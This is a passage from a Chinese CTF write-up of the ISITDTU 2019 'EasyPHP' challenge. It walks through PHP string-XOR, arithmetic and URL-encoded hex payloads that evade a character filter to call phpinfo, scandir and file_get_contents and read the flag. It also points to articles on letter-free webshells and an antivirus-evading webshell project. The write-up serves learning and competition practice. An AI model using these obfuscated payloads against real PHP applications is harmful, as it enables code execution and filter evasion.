观察正则表达式，我们还可以使用的符号有：
    ['!', '%', '+', '-', '*', '/', '>', ' ​ If both operands for the _&_ , _|_ and _^_ operators are strings, then the
> operation will be performed on the ASCII values of the characters that make
> up the strings and the result will be a string. In all other cases, both
> operands will be[converted to
> integers](https://www.php.net/manual/zh/language.types.integer.php#language.types.integer.casting)
> and the result will be an integer.
字符串的异或操作是基于字符的 ASCII 码来进行操作的，例如：
    php > var_dump(@a^"1");
    string(1) "P"
    php > echo ord("a");
    97
    php > echo ord("1");
    49
    php > echo 97^49;
    80
    php > echo chr(80);
    P
我们就可以利用之前的数字操作加上异或就可以得到我们自己想要的操作了。
    php > var_dump(@p^"1");
    string(1) "A"
    php > var_dump(@h^"1");
    string(1) "Y"
    php > var_dump(@i^"1");
    string(1) "X"
    php > var_dump(@n^"4");
    string(1) "Z"
    php > var_dump(@f^"1");
    string(1) "W"
    php > var_dump(@o^"5");
    string(1) "Z"
    php > var_dump(@phpinfo^"1111415");
    string(7) "AYAXZWZ"
    php > var_dump(@AYAXZWZ^"1111415");
    string(7) "phpinfo"
接下来就是数学时间了，另外，对于 int 型到 string 的转换，我们可以利用`trim`进行操作。
    var_dump(
        trim(
            (!!@a + !!@a + !!@a + !!@a + !!@a) *
            ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a) + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) *
            ((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a+ !!@a+ !!@a) + (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a ) - (!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a) - !!@a - !!@a- !!@a)
        ) ^ @AYAXZWZ
    );//phpinfo
结果回显`you are so close, omg`
### Step 4
绕过了正则接下来就是处理每个字符出现次数得小于 13 的问题了。
所以我们需要精简一下异或操作，尽量找一些相同的字符进行操作，我们可以找到如下的异或关系：
    p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|
    h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2|
    p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9|
    i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3|
    n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4|
    f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1|
    o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5|
尽量找到相同字符进行拼凑，我们就可以得到`AYAYYRY ^
1110746`，`AYR`加上`trim`中的`tim`，再加上`!!(+*);`，我们这样只用 13 个字符得到了`phpinfo()`。
    (AYAYYRY^trim(((((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a+!!a)))+(((!!a+!!a))**((!!a+!!a+!!a)))+(((!!a+!!a))**((!!a))))))();
这里可能需要注意的就是将`+`进行 urlencode ，因为`+`在 url 中是空格。
### Step 5
所以我们只需要按照同样的编码方式，尽量找相同的字符，就可以执行相关的 php 函数了，通过以下步骤就可以拿到 flag 了
    var_dump(scandir(getcwd()));
    array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(34) "n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt" }
    var_dump(file_get_contents(end(scandir(getcwd()))));
    string(34) "ISITDTU{Your PHP skill is so good}"
### Another Way-Step 1
单次异或可能会有一定的局限性，我们也可以通过两次或者多次异或来进行字符串的构造：
    (qiqhnin^iiiiibi^hhhhimh)();//phpinfo()
### Another Way-Step 2
接着我们就可以通过十六进制异或来进行字符串操作了。例如：
    print_r ^ 0xff -> 0x8f8d96918ba08d -> ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d))
    scandir ^ 0xff -> 0x8c9c9e919b968d -> ((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d))
          . ^ 0xff -> 0xd1             -> ((%ff)^(%d1))
当然也可以不使用 0xff ，使用以下 payload 就可以在没有字符限制的时候进行列目录了：
    ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%8d%96%91%8b%a0%8d))(((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%91%9b%96%8d))(((%ff)^(%d1))));
### Another Way-Step 3
通过总结我们所需要的字母：`._acdinprst`，然后进行类似的构造：
    t = s^c^d
    n = i^c^d
    r = a^c^p
    print_r -> ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f))
    scandir -> ((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f))
即可进行函数操作了
### Another Way 2
看这题的时候想起了p牛的几篇文章，大家可以参考一下：
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
这两篇也给了我当时很大的启发以及思路。尤其是第二篇中的 payload ，其实可以直接拿来用
大家可以详细的参考这两篇文章，p牛第一篇是通过位运算以及自增来进行操作，第二篇在 php7
环境下则是通过取反来进行操作，这里前面就简单介绍了一下通过异或的操作形式。
### Bonus
题外话，看到 @Mr.Liu
师傅写的一个随机异或免杀的马，还是比较有意思的一个项目:[Github地址](https://github.com/yzddmr6/webshell-venom)
# Reference
[EasyPHP (871 points)](https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU CTF 2019 Quals/web/easyphp.md)
[ISITDTU CTF 2019 - EasyPHP](https://github.com/jesux/ctf-write-ups/tree/master/isitdtu-2019/EasyPHP)
[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)